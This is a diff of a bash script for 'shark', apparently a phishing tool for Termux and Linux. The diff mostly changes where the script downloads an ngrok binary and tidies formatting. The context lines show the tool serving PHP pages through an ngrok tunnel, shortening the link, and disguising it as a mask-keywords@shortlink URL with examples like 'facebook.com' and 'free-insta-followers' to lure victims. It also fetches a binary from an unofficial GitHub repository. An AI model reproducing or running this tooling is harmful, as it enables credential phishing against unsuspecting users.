@@ -114,7 +114,6 @@ function os () {
 		shark="${PREFIX}/share/shark"
                 old_shark="${PREFIX}/bin/shark"
 		OS=TERMUX
-            
 	fi
 }
 
@@ -218,7 +217,7 @@ function fix_ngrok() {
 	launch="fixing ngrok"
 	splashdown="fixed ngrok";echo
 	if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
-			ngrok_url="https://github.com/tech2gamer/stuff/raw/main/ngrok-2in1.zip"
+			ngrok_url="https://github.com/Linux-Droid/Ngrok/raw/master/Ngrok_Linux_Droid.zip"
 		elif [[ "$arch" == *'aarch64'* ]]; then
 		         if [[ "$ArNam" == *'amd64'* ]]; then
                               ngrok_url="https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip"
@@ -226,12 +225,8 @@ function fix_ngrok() {
                               ngrok_url="https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.zip"
 		         fi
 		elif [[ "$arch" == *'x86_64'* ]]; then
-		         if [[ "$ArNam" == *'amd64'* ]]; then
-                              ngrok_url="https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip"
-                        else
-                              ngrok_url="https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.zip"
-		         fi	
-                else
+			ngrok_url="https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip"
+		else
 			ngrok_url="https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip"
 	fi
 	(wget --quiet ${ngrok_url} -O ngrok.zip) & spinner
@@ -348,7 +343,7 @@ function url_shortner() {
         else
         short=$(curl -s https://soo.gd/api.php?url=${ngrok_url})
         shorter=${short#https://}
-        fi
+        fi    
         read -p $'\n\033[1;92mshark \033[1;97m>> \033[1;37mMask Your url domain here \033[1;93m(Ex. https://facebook.com) :\e[0m ' mask
         url_checker $mask	
 	printf "${green}shark ${white}>> ${white}Enter your key words ${yellow}: Ex. free-insta-followers\n"        
@@ -357,6 +352,7 @@ function url_shortner() {
         final_url=$mask-$words@$shorter
 	printf "$final_url\n"
 }
+
 
 # MAIN 
 function main() {
@@ -389,7 +385,7 @@ else
 	main
 fi
 
-#launch="starting shark server"; splashdown="started shark server";printf "\n"; connection;php -S "$HOST":"$PORT" > /dev/null 2>&1 & sleep 0.1;ngrok http "$HOST":"$PORT" > /dev/null 2>&1 & sleep 20 & spinner;ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io");url_shortner;
+#launch="starting shark server"; splashdown="started shark server";printf "\n"; connection;php -S "$HOST":"$PORT" > /dev/null 2>&1 & sleep 0.1;ngrok http "$HOST":"$PORT" > /dev/null 2>&1 & sleep 20 & spinner;ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io");url_shortner
 }
 
 #banner2
@@ -400,11 +396,12 @@ banner2() {
         ║${white}   ║  ├┬┘├┤  ││├┤ │││ │ │├─┤│  └─┐${green}  ║
         ║${white}   ╚═╝┴└─└─┘─┴┘└─┘┘└┘ ┴ ┴┴ ┴┴─┘└─┘${green}  ║
         ╚════════════════════════════════════╝
-	SHARK BETA : ${white}v${VERSION}${green}
+
+        SHARK BETA : ${white}v${VERSION}${green}
          Reborn by : ${white}Mr.Derek(t2g)${green}
          Publisher : ${white}Bhavik Oza${green}
-	    Author : ${white}Ashish Singh${green}
-	     Note  : ${yellow}Soon will add New Features!${yellow}
+	          Author : ${white}Ashish Singh${green}
+	           Note  : ${yellow}Soon will add New Features!${yellow}
 
         》 ${cyan1}${final_url}${yellow} 《 MODIFIED URL. 
                 	or                 
